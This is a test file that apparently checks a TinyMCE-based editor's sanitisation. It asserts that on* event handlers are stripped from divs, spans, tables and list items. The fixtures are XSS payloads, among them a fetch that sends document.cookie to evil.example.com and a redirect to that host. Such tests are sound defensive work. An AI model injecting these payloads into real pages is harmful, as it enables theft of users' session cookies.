import {test, expect} from '../../fixtures/test'

// Event handlers on arbitrary HTML elements (onclick on div, onmouseover on span,
// onfocus on p) are XSS vectors even when the element itself is safe.
// TinyMCE's attribute whitelist must strip ALL on* handlers from ALL elements.
test.describe('event handler stripping on arbitrary elements', () => {
  test.beforeEach(async ({page, rcePage}) => {
    await page.goto('/scenarios/basic')
    await rcePage.waitForEditor()
  })

  async function setAndGet(page: any, html: string): Promise<string> {
    return page.evaluate((content: string) => {
      // @ts-expect-error -- TinyMCE global
      window.tinymce.activeEditor.setContent(content)
      // @ts-expect-error -- TinyMCE global
      return window.tinymce.activeEditor.getContent()
    }, html)
  }

  test('onclick on div is stripped', async ({page}) => {
    const content = await setAndGet(page, '<div onclick="alert(document.cookie)">Click me</div>')
    expect(content).not.toContain('onclick')
    expect(content).not.toContain('alert(document.cookie)')
    expect(content).toContain('Click me')
  })

  test('onmouseover on span is stripped', async ({page}) => {
    const content = await setAndGet(
      page,
      '<span onmouseover="fetch(\'https://evil.example.com/?\'+document.cookie)">hover text</span>',
    )
    expect(content).not.toContain('onmouseover')
    expect(content).not.toContain('evil.example.com')
    expect(content).toContain('hover text')
  })

  test('onfocus on paragraph is stripped', async ({page}) => {
    const content = await setAndGet(
      page,
      '<p onfocus="document.location=\'https://evil.example.com\'">paragraph</p>',
    )
    expect(content).not.toContain('onfocus')
    expect(content).toContain('paragraph')
  })

  test('onload on body-like div is stripped', async ({page}) => {
    const content = await setAndGet(page, '<div onload="alert(1)">content</div>')
    expect(content).not.toContain('onload')
    expect(content).toContain('content')
  })

  test('ondblclick on heading is stripped', async ({page}) => {
    const content = await setAndGet(page, '<h2 ondblclick="alert(\'xss\')">Safe Heading</h2>')
    expect(content).not.toContain('ondblclick')
    expect(content).toContain('Safe Heading')
  })

  test('onkeypress on input-like element is stripped', async ({page}) => {
    const content = await setAndGet(page, '<span onkeypress="exfiltrate(event)">key capture</span>')
    expect(content).not.toContain('onkeypress')
    expect(content).not.toContain('exfiltrate')
    expect(content).toContain('key capture')
  })

  test('multiple event handlers on same element are all stripped', async ({page}) => {
    const content = await setAndGet(
      page,
      '<div onclick="a()" onmouseover="b()" onkeydown="c()" onfocus="d()">multi-handler</div>',
    )
    expect(content).not.toContain('onclick')
    expect(content).not.toContain('onmouseover')
    expect(content).not.toContain('onkeydown')
    expect(content).not.toContain('onfocus')
    expect(content).toContain('multi-handler')
  })

  test('event handler on table element is stripped (not just on div/span)', async ({page}) => {
    const content = await setAndGet(page, '<table onclick="steal()"><tr><td>data</td></tr></table>')
    expect(content).not.toContain('onclick')
    expect(content).not.toContain('steal()')
    expect(content).toContain('data')
  })

  test('event handler on list item is stripped', async ({page}) => {
    const content = await setAndGet(page, '<ul><li onmouseenter="track(this)">List item</li></ul>')
    expect(content).not.toContain('onmouseenter')
    expect(content).not.toContain('track(')
    expect(content).toContain('List item')
  })
})
